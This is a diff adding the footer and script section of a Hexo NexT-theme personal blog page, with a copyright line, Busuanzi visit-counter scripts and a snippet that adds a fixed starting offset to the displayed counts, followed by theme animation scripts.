+          <a href="https://canzik.github.io/" title="https:&#x2F;&#x2F;canzik.github.io&#x2F;" rel="noopener" target="_blank">Canzik's blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-2-14 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bcYng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共50.6k字</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+  </body>
+</html>
